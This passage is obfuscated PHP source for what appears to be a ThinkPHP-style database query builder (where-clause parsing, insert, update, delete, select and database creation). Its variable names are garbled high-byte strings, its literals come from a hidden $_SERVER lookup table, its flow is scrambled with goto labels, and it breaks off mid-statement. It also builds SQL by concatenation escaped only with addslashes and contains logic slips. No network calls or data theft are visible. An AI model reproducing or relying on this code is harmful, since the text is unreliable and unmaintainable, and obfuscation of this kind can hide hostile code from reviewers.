$a„‹ë¦”‚Ä[50] . $dÀ‡îÏÄá . $a„‹ë¦”‚Ä[50]; unset($c¬‡Û‹›®‰[$a„‹ë¦”‚Ä[965]]); } else { $dÀ‡îÏÄá = $a„‹ë¦”‚Ä[969]; } foreach ($c¬‡Û‹›®‰ as $aÙØ£×”‡« => $b–áÌ™Ó) { $a¾“ßÍ£’£ .= $a„‹ë¦”‚Ä[284]; if (is_numeric($aÙØ£×”‡«)) { $aÙØ£×”‡« = $a„‹ë¦”‚Ä[970]; } if (0 === strpos($aÙØ£×”‡«, $a„‹ë¦”‚Ä[71])) { $a¾“ßÍ£’£ .= $this->parseThinkWhere($aÙØ£×”‡«, $b–áÌ™Ó); } else { if (!preg_match($a„‹ë¦”‚Ä[971], trim($aÙØ£×”‡«))) { think_exception(think_lang($a„‹ë¦”‚Ä[972]) . $a„‹ë¦”‚Ä[4] . $aÙØ£×”‡«); } $C‚ì†Ä˜ßÏ = is_array($b–áÌ™Ó) && isset($b–áÌ™Ó[$a„‹ë¦”‚Ä[973]]); $aÙØ£×”‡« = trim($aÙØ£×”‡«); if (strpos($aÙØ£×”‡«, $a„‹ë¦”‚Ä[290])) { $e¹„¬ƒ…Ç = explode($a„‹ë¦”‚Ä[290], $aÙØ£×”‡«); $c¨ØÙë‹È« = array(); foreach ($e¹„¬ƒ…Ç as $Dù¥Ç±ÉõÆ => $a¼‰È×‚™¿) { $Dí÷­§çŠê = $C‚ì†Ä˜ßÏ ? $b–áÌ™Ó[$Dù¥Ç±ÉõÆ] : $b–áÌ™Ó; $c¨ØÙë‹È«[] = $a„‹ë¦”‚Ä[267] . $this->parseWhereItem($this->parseKey($a¼‰È×‚™¿), $Dí÷­§çŠê) . $a„‹ë¦”‚Ä[873]; } $a¾“ßÍ£’£ .= implode($a„‹ë¦”‚Ä[974], $c¨ØÙë‹È«); } elseif (strpos($aÙØ£×”‡«, $a„‹ë¦”‚Ä[291])) { $e¹„¬ƒ…Ç = explode($a„‹ë¦”‚Ä[291], $aÙØ£×”‡«); $c¨ØÙë‹È« = array(); foreach ($e¹„¬ƒ…Ç as $Dù¥Ç±ÉõÆ => $a¼‰È×‚™¿) { $Dí÷­§çŠê = $C‚ì†Ä˜ßÏ ? $b–áÌ™Ó[$Dù¥Ç±ÉõÆ] : $b–áÌ™Ó; $c¨ØÙë‹È«[] = $a„‹ë¦”‚Ä[267] . $this->parseWhereItem($this->parseKey($a¼‰È×‚™¿), $Dí÷­§çŠê) . $a„‹ë¦”‚Ä[873]; } $a¾“ßÍ£’£ .= implode($a„‹ë¦”‚Ä[969], $c¨ØÙë‹È«); } else { $a¾“ßÍ£’£ .= $this->parseWhereItem($this->parseKey($aÙØ£×”‡«), $b–áÌ™Ó); } } $a¾“ßÍ£’£ .= $a„‹ë¦”‚Ä[285] . $dÀ‡îÏÄá; } $a¾“ßÍ£’£ = substr($a¾“ßÍ£’£, 0, -strlen($dÀ‡îÏÄá)); } return empty($a¾“ßÍ£’£) ? $a„‹ë¦”‚Ä[33] : $a„‹ë¦”‚Ä[975] . $a¾“ßÍ£’£; } protected function parseWhereItem($c¼¤¢£“á„, $dæËñò²®) { $eîÆø®±— =& $_SERVER[úÉ·öƒÑì©]; $d¢À¥“¦êå = $eîÆø®±—[33]; if (is_array($dæËñò²®)) { if (is_string($dæËñò²®[0])) { $fÂŸ¾‡”ÓÎ = strtolower($dæËñò²®[0]); if (in_array($dæËñò²®[0], array($eîÆø®±—[959], $eîÆø®±—[976], $eîÆø®±—[977], $eîÆø®±—[978], $eîÆø®±—[979], $eîÆø®±—[980]))) { $d¢À¥“¦êå .= $c¼¤¢£“á„ . $eîÆø®±—[50] . $dæËñò²®[0] . $eîÆø®±—[50] . $this->parseValue($dæËñò²®[1]); } elseif (preg_match($eîÆø®±—[981], $dæËñò²®[0])) { $d¢À¥“¦êå .= $c¼¤¢£“á„ . $eîÆø®±—[50] . $this->exp[$fÂŸ¾‡”ÓÎ] . $eîÆø®±—[50] . $this->parseValue($dæËñò²®[1]); } elseif (preg_match($eîÆø®±—[982], $dæËñò²®[0])) { if (is_array($dæËñò²®[1])) { $D˜¨ÀêÇ = isset($dæËñò²®[2]) ? strtoupper($dæËñò²®[2]) : $eîÆø®±—[967]; if (in_array($D˜¨ÀêÇ, array($eîÆø®±—[966], $eîÆø®±—[967], $eîÆø®±—[968]))) { $eËñ÷¤·øŒ = array(); foreach ($dæËñò²®[1] as $aÜÉè£´¸Î) { $eËñ÷¤·øŒ[] = $c¼¤¢£“á„ . $eîÆø®±—[50] . $this->exp[$fÂŸ¾‡”ÓÎ] . $eîÆø®±—[50] . $this->parseValue($aÜÉè£´¸Î); } $d¢À¥“¦êå .= $eîÆø®±—[267] . implode($eîÆø®±—[50] . $D˜¨ÀêÇ . $eîÆø®±—[50], $eËñ÷¤·øŒ) . $eîÆø®±—[873]; } } else { $d¢À¥“¦êå .= $c¼¤¢£“á„ . $eîÆø®±—[50] . $this->exp[$fÂŸ¾‡”ÓÎ] . $eîÆø®±—[50] . $this->parseValue($dæËñò²®[1]); } } elseif ($eîÆø®±—[304] == $fÂŸ¾‡”ÓÎ) { $d¢À¥“¦êå .= $eîÆø®±—[871] . $c¼¤¢£“á„ . $eîÆø®±—[50] . $dæËñò²®[1] . $eîÆø®±—[983]; } elseif (preg_match($eîÆø®±—[984], $dæËñò²®[0])) { $d¢À¥“¦êå .= $dæËñò²®[0]; } elseif (preg_match($eîÆø®±—[985], $dæËñò²®[0])) { if (isset($dæËñò²®[2]) && $eîÆø®±—[304] == $dæËñò²®[2]) { $d¢À¥“¦êå .= $c¼¤¢£“á„ . $eîÆø®±—[50] . $this->exp[$fÂŸ¾‡”ÓÎ] . $eîÆø®±—[50] . $dæËñò²®[1]; } else { if (is_string($dæËñò²®[1])) { $dæËñò²®[1] = explode($eîÆø®±—[47], $dæËñò²®[1]); } $eÃ‹ìùº‰© = implode($eîÆø®±—[47], $this->parseValue($dæËñò²®[1])); $d¢À¥“¦êå .= $c¼¤¢£“á„ . $eîÆø®±—[50] . $this->exp[$fÂŸ¾‡”ÓÎ] . $eîÆø®±—[871] . $eÃ‹ìùº‰© . $eîÆø®±—[873]; } } elseif (preg_match($eîÆø®±—[986], $dæËñò²®[0])) { $E†•¸ÎèƒŠ = is_string($dæËñò²®[1]) ? explode($eîÆø®±—[47], $dæËñò²®[1]) : $dæËñò²®[1]; $d¢À¥“¦êå .= $eîÆø®±—[871] . $c¼¤¢£“á„ . $eîÆø®±—[50] . $this->exp[$fÂŸ¾‡”ÓÎ] . $eîÆø®±—[50] . $this->parseValue($E†•¸ÎèƒŠ[0]) . $eîÆø®±—[969] . $this->parseValue($E†•¸ÎèƒŠ[1]) . $eîÆø®±—[285]; } else { think_exception(think_lang($eîÆø®±—[972]) . $eîÆø®±—[4] . $dæËñò²®[0]); } } else { $eÈÂÇêæï = count($dæËñò²®); $f†©¢¢¤Ö³ = $eîÆø®±—[33]; if (is_string($dæËñò²®[$eÈÂÇêæï - 1])) { $f†©¢¢¤Ö³ = isset($dæËñò²®[$eÈÂÇêæï - 1]) ? strtoupper($dæËñò²®[$eÈÂÇêæï - 1]) : $eîÆø®±—[33]; if (in_array($f†©¢¢¤Ö³, array($eîÆø®±—[966], $eîÆø®±—[967], $eîÆø®±—[968]))) { $eÈÂÇêæï = $eÈÂÇêæï - 1; } } else { $f†©¢¢¤Ö³ = $eîÆø®±—[966]; } for ($DÔÈíœæªï = 0; $DÔÈíœæªï < $eÈÂÇêæï; $DÔÈíœæªï++) { $E†•¸ÎèƒŠ = is_array($dæËñò²®[$DÔÈíœæªï]) ? $dæËñò²®[$DÔÈíœæªï][1] : $dæËñò²®[$DÔÈíœæªï]; if ($eîÆø®±—[304] == strtolower($dæËñò²®[$DÔÈíœæªï][0])) { $d¢À¥“¦êå .= $eîÆø®±—[267] . $c¼¤¢£“á„ . $eîÆø®±—[50] . $E†•¸ÎèƒŠ . $eîÆø®±—[983] . $f†©¢¢¤Ö³ . $eîÆø®±—[50]; } else { $C‹†¶§å±± = is_array($dæËñò²®[$DÔÈíœæªï]) ? $this->exp[strtolower($dæËñò²®[$DÔÈíœæªï][0])] : $eîÆø®±—[959]; if (!$C‹†¶§å±± && is_array($dæËñò²®[$DÔÈíœæªï]) && in_array($dæËñò²®[$DÔÈíœæªï][0], array($eîÆø®±—[959], $eîÆø®±—[976], $eîÆø®±—[977], $eîÆø®±—[978], $eîÆø®±—[979], $eîÆø®±—[980]))) { $C‹†¶§å±± = $dæËñò²®[$DÔÈíœæªï][0]; } $d¢À¥“¦êå .= $eîÆø®±—[267] . $c¼¤¢£“á„ . $eîÆø®±—[50] . $C‹†¶§å±± . $eîÆø®±—[50] . $this->parseValue($E†•¸ÎèƒŠ) . $eîÆø®±—[983] . $f†©¢¢¤Ö³ . $eîÆø®±—[50]; } } $d¢À¥“¦êå = substr($d¢À¥“¦êå, 0, -4); } } else { $d¢À¥“¦êå .= $c¼¤¢£“á„ . $eîÆø®±—[987] . $this->parseValue($dæËñò²®); } return $d¢À¥“¦êå; } protected function parseThinkWhere($Eäˆ¿”Ì÷±, $dÕÔå§ÔË) { $D‰ò¥–’´¥ =& $_SERVER[úÉ·öƒÑì©]; $a¢Õœ¹©Ë— = $D‰ò¥–’´¥[33]; switch ($Eäˆ¿”Ì÷±) { case $D‰ò¥–’´¥[359]: $a¢Õœ¹©Ë— = $dÕÔå§ÔË; break; case $D‰ò¥–’´¥[970]: $a¢Õœ¹©Ë— = is_string($dÕÔå§ÔË) ? $dÕÔå§ÔË : substr($this->parseWhere($dÕÔå§ÔË), 6); break; case $D‰ò¥–’´¥[988]: parse_str($dÕÔå§ÔË, $FŠèÀ•¢™Ê); if (isset($FŠèÀ•¢™Ê[$D‰ò¥–’´¥[965]])) { $bæÅ¤›İ = $D‰ò¥–’´¥[50] . strtoupper($FŠèÀ•¢™Ê[$D‰ò¥–’´¥[965]]) . $D‰ò¥–’´¥[50]; unset($FŠèÀ•¢™Ê[$D‰ò¥–’´¥[965]]); } else { $bæÅ¤›İ = $D‰ò¥–’´¥[969]; } $f³ƒÍîòàø = array(); foreach ($FŠèÀ•¢™Ê as $dÔ¨Ù×šÎ» => $aÄŠ¢Š„) { $f³ƒÍîòàø[] = $this->parseKey($dÔ¨Ù×šÎ») . $D‰ò¥–’´¥[987] . $this->parseValue($aÄŠ¢Š„); } $a¢Õœ¹©Ë— = implode($bæÅ¤›İ, $f³ƒÍîòàø); break; } return $a¢Õœ¹©Ë—; } protected function parseLimit($E™¤ÔâÉ¨ƒ) { $fè¹ƒåÎà® =& $_SERVER[úÉ·öƒÑì©]; return !empty($E™¤ÔâÉ¨ƒ) ? $fè¹ƒåÎà®[48] . $E™¤ÔâÉ¨ƒ . $fè¹ƒåÎà®[50] : $fè¹ƒåÎà®[33]; } protected function parseJoin($EºÏ»•°çÁ) { $E·´Ş…†Ùç =& $_SERVER[úÉ·öƒÑì©]; $e²‘îçô = $E·´Ş…†Ùç[33]; if (!empty($EºÏ»•°çÁ)) { if (is_array($EºÏ»•°çÁ)) { foreach ($EºÏ»•°çÁ as $c¨å„À½Ö => $bµëÓÁ…µˆ) { if (!1 !== stripos($bµëÓÁ…µˆ, $E·´Ş…†Ùç[989])) { $e²‘îçô .= $E·´Ş…†Ùç[50] . $bµëÓÁ…µˆ; } else { $e²‘îçô .= $E·´Ş…†Ùç[990] . $bµëÓÁ…µˆ; } } } else { $e²‘îçô .= $E·´Ş…†Ùç[990] . $EºÏ»•°çÁ; } } $e²‘îçô = preg_replace($E·´Ş…†Ùç[991], think_config($E·´Ş…†Ùç[897]) . $E·´Ş…†Ùç[992], $e²‘îçô); return $e²‘îçô; } protected function parseOrder($CŸÅøÏï¸) { $A»èâñ¸Ò =& $_SERVER[úÉ·öƒÑì©]; if (is_array($CŸÅøÏï¸)) { $F¸‰†Ö›ğµ = array(); foreach ($CŸÅøÏï¸ as $fÂãÜ®÷Ÿ¨ => $f¡ğŒ¤ŠŸ) { if (is_numeric($fÂãÜ®÷Ÿ¨)) { $F¸‰†Ö›ğµ[] = $this->parseKey($f¡ğŒ¤ŠŸ); } else { $f¡ğŒ¤ŠŸ = in_array(strtoupper(trim($f¡ğŒ¤ŠŸ)), array($A»èâñ¸Ò[993], $A»èâñ¸Ò[994])) ? $A»èâñ¸Ò[50] . $f¡ğŒ¤ŠŸ : $A»èâñ¸Ò[33]; if (preg_match($A»èâñ¸Ò[995], $fÂãÜ®÷Ÿ¨)) { $F¸‰†Ö›ğµ[] = $this->parseKey($fÂãÜ®÷Ÿ¨) . $f¡ğŒ¤ŠŸ; } else { think_exception($A»èâñ¸Ò[996] . $fÂãÜ®÷Ÿ¨); } } } $CŸÅøÏï¸ = implode($A»èâñ¸Ò[47], $F¸‰†Ö›ğµ); } return !empty($CŸÅøÏï¸) ? $A»èâñ¸Ò[997] . $CŸÅøÏï¸ : $A»èâñ¸Ò[33]; } protected function parseGroup($EŠÀÓôÂ°) { $BºˆÙİÌ¥â =& $_SERVER[úÉ·öƒÑì©]; return !empty($EŠÀÓôÂ°) ? $BºˆÙİÌ¥â[998] . $EŠÀÓôÂ° : $BºˆÙİÌ¥â[33]; } protected function parseHaving($C•Å–î§) { $F•ÎÔÇÕî =& $_SERVER[úÉ·öƒÑì©]; return !empty($C•Å–î§) ? $F•ÎÔÇÕî[999] . $C•Å–î§ : $F•ÎÔÇÕî[33]; } protected function parseComment($CŠÃ·×Ç¨) { $b°˜°…¾ =& $_SERVER[úÉ·öƒÑì©]; return !empty($CŠÃ·×Ç¨) ? $b°˜°…¾[1000] . $CŠÃ·×Ç¨ . $b°˜°…¾[1001] : $b°˜°…¾[33]; } protected function parseDistinct($A’¨ç´ä“—) { $E“—”ÚŒ¹Æ =& $_SERVER[úÉ·öƒÑì©]; return !empty($A’¨ç´ä“—) ? $E“—”ÚŒ¹Æ[1002] : $E“—”ÚŒ¹Æ[33]; } protected function parseUnion($eµğÓŒ©æ©) { $d§±í’‘Æ =& $_SERVER[úÉ·öƒÑì©]; if (empty($eµğÓŒ©æ©)) { return $d§±í’‘Æ[33]; } if (isset($eµğÓŒ©æ©[$d§±í’‘Æ[355]])) { $a¦ß…³ñçÆ = $d§±í’‘Æ[1003]; unset($eµğÓŒ©æ©[$d§±í’‘Æ[355]]); } else { $a¦ß…³ñçÆ = $d§±í’‘Æ[1004]; } foreach ($eµğÓŒ©æ© as $bœÛŠàÃ) { $dó®Ôµ¬ã[] = $a¦ß…³ñçÆ . (is_array($bœÛŠàÃ) ? $this->buildSelectSql($bœÛŠàÃ) : $bœÛŠàÃ); } return implode($d§±í’‘Æ[50], $dó®Ôµ¬ã); } public function insert($Bî¬¿±ê±, $DŒ±ˆØ›å = array(), $dÌáŞåâÅ¿ = false) { goto c°¸‡ŞïµË; aÌ«¾ø: foreach ($Bî¬¿±ê± as $bë‚ëë¬ => $C’†èõ»ï­) { if (is_array($C’†èõ»ï­) && $B³àÑ‘‘°[304] == $C’†èõ»ï­[0]) { $Eº ÏÕÇËÉ[] = $this->parseKey($bë‚ëë¬); $C®Ï­ç•¬½[] = $C’†èõ»ï­[1]; } elseif (is_scalar($C’†èõ»ï­) || is_null($C’†èõ»ï­)) { $Eº ÏÕÇËÉ[] = $this->parseKey($bë‚ëë¬); $C®Ï­ç•¬½[] = $this->parseValue($C’†èõ»ï­); } } $B¯…Óø¶Ïê = ($dÌáŞåâÅ¿ ? $B³àÑ‘‘°[875] : $B³àÑ‘‘°[876]) . $B³àÑ‘‘°[877] . $this->parseTable($DŒ±ˆØ›å[$B³àÑ‘‘°[286]]) . $B³àÑ‘‘°[871] . implode($B³àÑ‘‘°[47], $Eº ÏÕÇËÉ) . $B³àÑ‘‘°[872] . implode($B³àÑ‘‘°[47], $C®Ï­ç•¬½) . $B³àÑ‘‘°[873]; $B¯…Óø¶Ïê .= $this->parseLock(isset($DŒ±ˆØ›å[$B³àÑ‘‘°[828]]) ? $DŒ±ˆØ›å[$B³àÑ‘‘°[828]] : !1); goto aòÎ¤Øå„; c°¸‡ŞïµË: $B³àÑ‘‘° =& $_SERVER[úÉ·öƒÑì©]; $C®Ï­ç•¬½ = $Eº ÏÕÇËÉ = array(); $this->model = $DŒ±ˆØ›å[$B³àÑ‘‘°[288]]; goto aÌ«¾ø; aòÎ¤Øå„: $B¯…Óø¶Ïê .= $this->parseComment(!empty($DŒ±ˆØ›å[$B³àÑ‘‘°[361]]) ? $DŒ±ˆØ›å[$B³àÑ‘‘°[361]] : $B³àÑ‘‘°[33]); return $this->execute($B¯…Óø¶Ïê, $this->parseBind(!empty($DŒ±ˆØ›å[$B³àÑ‘‘°[292]]) ? $DŒ±ˆØ›å[$B³àÑ‘‘°[292]] : array())); goto fÙŸÎÅÚ‡; fÙŸÎÅÚ‡: } public function selectInsert($F¶âğø”Àô, $f¡šø¨Šë–, $d½í “Ÿè = array()) { goto fŸ±§ÚÎ­; fŸ±§ÚÎ­: $fÊ…ğù†º =& $_SERVER[úÉ·öƒÑì©]; $this->model = $d½í “Ÿè[$fÊ…ğù†º[288]]; if (is_string($F¶âğø”Àô)) { $F¶âğø”Àô = explode($fÊ…ğù†º[47], $F¶âğø”Àô); } goto FƒíòÉÌÔ”; FƒíòÉÌÔ”: array_walk($F¶âğø”Àô, array($this, $fÊ…ğù†º[874])); $A‚„ˆ‹ÁÓ‹ = $fÊ…ğù†º[1005] . $this->parseTable($f¡šø¨Šë–) . $fÊ…ğù†º[871] . implode($fÊ…ğù†º[47], $F¶âğø”Àô) . $fÊ…ğù†º[983]; $A‚„ˆ‹ÁÓ‹ .= $this->buildSelectSql($d½í “Ÿè); goto FèÕùß˜ñÕ; FèÕùß˜ñÕ: return $this->execute($A‚„ˆ‹ÁÓ‹, $this->parseBind(!empty($d½í “Ÿè[$fÊ…ğù†º[292]]) ? $d½í “Ÿè[$fÊ…ğù†º[292]] : array())); goto Eª™œì§ Ê; Eª™œì§ Ê: } public function update($DÜÃ¿ŒÆÌÕ, $E´Ïê÷ƒÏã) { $c†×ÌˆòÕî =& $_SERVER[úÉ·öƒÑì©]; $this->model = $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[288]]; $cÉå»º¢¼‰ = $c†×ÌˆòÕî[1006] . $this->parseTable($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[286]]) . $this->parseSet($DÜÃ¿ŒÆÌÕ) . $this->parseWhere(!empty($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[282]]) ? $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[282]] : $c†×ÌˆòÕî[33]) . $this->parseOrder(!empty($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[372]]) ? $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[372]] : $c†×ÌˆòÕî[33]) . $this->parseLimit(!empty($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[299]]) ? $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[299]] : $c†×ÌˆòÕî[33]) . $this->parseLock(isset($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[828]]) ? $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[828]] : !1) . $this->parseComment(!empty($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[361]]) ? $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[361]] : $c†×ÌˆòÕî[33]); return $this->execute($cÉå»º¢¼‰, $this->parseBind(!empty($E´Ïê÷ƒÏã[$c†×ÌˆòÕî[292]]) ? $E´Ïê÷ƒÏã[$c†×ÌˆòÕî[292]] : array())); } public function delete($eå”è÷¶Ê = array()) { $dàİ’äï =& $_SERVER[úÉ·öƒÑì©]; $this->model = $eå”è÷¶Ê[$dàİ’äï[288]]; $f‡Å›é¨À“ = $dàİ’äï[1007] . $this->parseTable($eå”è÷¶Ê[$dàİ’äï[286]]) . $this->parseWhere(!empty($eå”è÷¶Ê[$dàİ’äï[282]]) ? $eå”è÷¶Ê[$dàİ’äï[282]] : $dàİ’äï[33]) . $this->parseOrder(!empty($eå”è÷¶Ê[$dàİ’äï[372]]) ? $eå”è÷¶Ê[$dàİ’äï[372]] : $dàİ’äï[33]) . $this->parseLimit(!empty($eå”è÷¶Ê[$dàİ’äï[299]]) ? $eå”è÷¶Ê[$dàİ’äï[299]] : $dàİ’äï[33]) . $this->parseLock(isset($eå”è÷¶Ê[$dàİ’äï[828]]) ? $eå”è÷¶Ê[$dàİ’äï[828]] : !1) . $this->parseComment(!empty($eå”è÷¶Ê[$dàİ’äï[361]]) ? $eå”è÷¶Ê[$dàİ’äï[361]] : $dàİ’äï[33]); return $this->execute($f‡Å›é¨À“, $this->parseBind(!empty($eå”è÷¶Ê[$dàİ’äï[292]]) ? $eå”è÷¶Ê[$dàİ’äï[292]] : array())); } public function select($fˆ„’½äÕ‰ = array()) { goto aÚÓÍ–’Ã…; b±ôŞ¶»À¿: $Ağ»¸Ûõá = isset($fˆ„’½äÕ‰[$BÍéÇç“ä³[356]]) ? $fˆ„’½äÕ‰[$BÍéÇç“ä³[356]] : !1; if ($Ağ»¸Ûõá) { $aîó…ÆÌÇğ = is_string($Ağ»¸Ûõá[$BÍéÇç“ä³[93]]) ? $Ağ»¸Ûõá[$BÍéÇç“ä³[93]] : $BÍéÇç“ä³[1008] . md5($e‰›†í÷»ä); $A„î‚ÍÃ¯ = think_cache($aîó…ÆÌÇğ, $BÍéÇç“ä³[33], $Ağ»¸Ûõá); if (!1 !== $A„î‚ÍÃ¯) { return $A„î‚ÍÃ¯; } } $cêÕäÜİÒ = $this->query($e‰›†í÷»ä, $this->parseBind(!empty($fˆ„’½äÕ‰[$BÍéÇç“ä³[292]]) ? $fˆ„’½äÕ‰[$BÍéÇç“ä³[292]] : array())); goto Bò£Â·¶ƒ; Bò£Â·¶ƒ: if ($Ağ»¸Ûõá && !1 !== $cêÕäÜİÒ) { think_cache($aîó…ÆÌÇğ, $cêÕäÜİÒ, $Ağ»¸Ûõá); } return $cêÕäÜİÒ; goto eÏÔÔ‹ì; aÚÓÍ–’Ã…: $BÍéÇç“ä³ =& $_SERVER[úÉ·öƒÑì©]; $this->model = $fˆ„’½äÕ‰[$BÍéÇç“ä³[288]]; $e‰›†í÷»ä = $this->buildSelectSql($fˆ„’½äÕ‰); goto b±ôŞ¶»À¿; eÏÔÔ‹ì: } public function buildSelectSql($EÁ¨±±ËŸ = array()) { goto báğ¼”£‰; E›¹†ÊŠâ‘: return $fĞó‘ñ‰ª; goto cÜÜõ¿˜ªÔ; d…Õº…ê: $fĞó‘ñ‰ª = $this->parseSql($this->selectSql, $EÁ¨±±ËŸ); $fĞó‘ñ‰ª .= $this->parseLock(isset($EÁ¨±±ËŸ[$D°©Î½„Ü‘[828]]) ? $EÁ¨±±ËŸ[$D°©Î½„Ü‘[828]] : !1); if (isset($c‹ŠĞ®Š‰Î)) { think_cache($c‹ŠĞ®Š‰Î, $fĞó‘ñ‰ª); } goto E›¹†ÊŠâ‘; báğ¼”£‰: $D°©Î½„Ü‘ =& $_SERVER[úÉ·öƒÑì©]; if (isset($EÁ¨±±ËŸ[$D°©Î½„Ü‘[360]])) { if (strpos($EÁ¨±±ËŸ[$D°©Î½„Ü‘[360]], $D°©Î½„Ü‘[47])) { list($eÈ–îğïÖ, $dÆØé¶³ë£) = explode($D°©Î½„Ü‘[47], $EÁ¨±±ËŸ[$D°©Î½„Ü‘[360]]); } else { $eÈ–îğïÖ = $EÁ¨±±ËŸ[$D°©Î½„Ü‘[360]]; } $eÈ–îğïÖ = $eÈ–îğïÖ ? $eÈ–îğïÖ : 1; $dÆØé¶³ë£ = isset($dÆØé¶³ë£) ? $dÆØé¶³ë£ : (is_numeric($EÁ¨±±ËŸ[$D°©Î½„Ü‘[299]]) ? $EÁ¨±±ËŸ[$D°©Î½„Ü‘[299]] : 20); $CŞ¥”ù×¡¶ = $dÆØé¶³ë£ * ((int) $eÈ–îğïÖ - 1); $EÁ¨±±ËŸ[$D°©Î½„Ü‘[299]] = $CŞ¥”ù×¡¶ . $D°©Î½„Ü‘[47] . $dÆØé¶³ë£; } if (think_config($D°©Î½„Ü‘[1009])) { $c‹ŠĞ®Š‰Î = $D°©Î½„Ü‘[1010] . md5(serialize($EÁ¨±±ËŸ)); $cªßäªÕÜÁ = think_cache($c‹ŠĞ®Š‰Î); if ($cªßäªÕÜÁ) { return $cªßäªÕÜÁ; } } goto d…Õº…ê; cÜÜõ¿˜ªÔ: } public function parseSql($Fïğ›Ó÷, $c½Ü£ßíõ = array()) { $CÖ¡ö÷À =& $_SERVER[úÉ·öƒÑì©]; $Fïğ›Ó÷ = str_replace(array($CÖ¡ö÷À[1011], $CÖ¡ö÷À[1012], $CÖ¡ö÷À[1013], $CÖ¡ö÷À[1014], $CÖ¡ö÷À[1015], $CÖ¡ö÷À[1016], $CÖ¡ö÷À[1017], $CÖ¡ö÷À[1018], $CÖ¡ö÷À[1019], $CÖ¡ö÷À[1020], $CÖ¡ö÷À[1021]), array($this->parseTable("{$c½Ü£ßíõ[$CÖ¡ö÷À[286]]}"), $this->parseDistinct(isset($c½Ü£ßíõ[$CÖ¡ö÷À[1022]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[1022]] : !1), $this->parseField(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[280]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[280]] : $CÖ¡ö÷À[182]), $this->parseJoin(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[289]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[289]] : $CÖ¡ö÷À[33]), $this->parseWhere(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[282]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[282]] : $CÖ¡ö÷À[33]), $this->parseGroup(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[1023]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[1023]] : $CÖ¡ö÷À[33]), $this->parseHaving(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[1024]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[1024]] : $CÖ¡ö÷À[33]), $this->parseOrder(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[372]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[372]] : $CÖ¡ö÷À[33]), $this->parseLimit(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[299]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[299]] : $CÖ¡ö÷À[33]), $this->parseUnion(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[354]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[354]] : $CÖ¡ö÷À[33]), $this->parseComment(!empty($c½Ü£ßíõ[$CÖ¡ö÷À[361]]) ? $c½Ü£ßíõ[$CÖ¡ö÷À[361]] : $CÖ¡ö÷À[33])), $Fïğ›Ó÷); return $Fïğ›Ó÷; } public function getLastSql($DºÅÑÑºóÑ = '') { return $DºÅÑÑºóÑ ? $this->modelSql[$DºÅÑÑºóÑ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($dšïÙËæÄ¸) { return addslashes($dšïÙËæÄ¸); } public function setModel($aãªÂ¥ÀùÍ) { $this->model = $aãªÂ¥ÀùÍ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($c‹ó’šÈŠ÷, $F…×à—Ğù• = '') { $this->database = $c‹ó’šÈŠ÷; $this->type = $F…×à—Ğù•; } public function model($Eî­ˆ‰í¥÷ = '') { return new ModelBase($Eî­ˆ‰í¥÷, $_SERVER[úÉ·öƒÑì©][33], $this->database); } public function db($e¬•İŸ¢ö = false) { goto Cß¼åÎñÕ¾; f‰ƒ±µ…‹Ù: $aŞ¤¼±²ºÇ = $D”òà®Ù„[$fØ·›ƒ¸öÉ[937]]; $D”òà®Ù„[$fØ·›ƒ¸öÉ[937]] = $fØ·›ƒ¸öÉ[33]; if ($D”òà®Ù„[$fØ·›ƒ¸öÉ[770]] == $fØ·›ƒ¸öÉ[771]) { $c°Ù¸ö¶å½ = $D”òà®Ù„[$fØ·›ƒ¸öÉ[772]]; $D”òà®Ù„[$fØ·›ƒ¸öÉ[772]] = substr($c°Ù¸ö¶å½, 0, strrpos($c°Ù¸ö¶å½, $fØ·›ƒ¸öÉ[1025])); } goto A›óÜ–İÇ; Cß¼åÎñÕ¾: $fØ·›ƒ¸öÉ =& $_SERVER[úÉ·öƒÑì©]; $D”òà®Ù„ = array_change_key_case($this->database); if ($this->type == $fØ·›ƒ¸öÉ[9] || !$e¬•İŸ¢ö) { return $this->model()->db(); } goto f‰ƒ±µ…‹Ù; A›óÜ–İÇ: $this->database = $D”òà®Ù„; $AÚÂ£¨Ó¬³ = $this->model()->db(); try { $B……¡ªŸ°³ = $AÚÂ£¨Ó¬³->execute("\163\x68\x6f\167\40\144\x61\164\141\x62\141\x73\145\163\40\x6c\x69\x6b\x65\x20\47{$aŞ¤¼±²ºÇ}\x27"); } catch (Exception $FÛÚí…Û±Ö) { } goto dè¯Ó…ˆ; b‹à²Ş•è‡: $this->database = $D”òà®Ù„; $AÚÂ£¨Ó¬³->execute("\165\x73\x65\40\x60{$aŞ¤¼±²ºÇ}\x60"); return $AÚÂ£¨Ó¬³; goto aëŠåØ¤İ; dè¯Ó…ˆ: if (!$B……¡ªŸ°³) { $AÚÂ£¨Ó¬³->execute("\143\162\x65\x61\164\145\40\144\141\164\x61\x62\141\163\145\x20\140{$aŞ¤¼±²ºÇ}\x60"); } $D”òà®Ù„[$fØ·›ƒ¸öÉ[937]] = $aŞ¤¼±²ºÇ; if 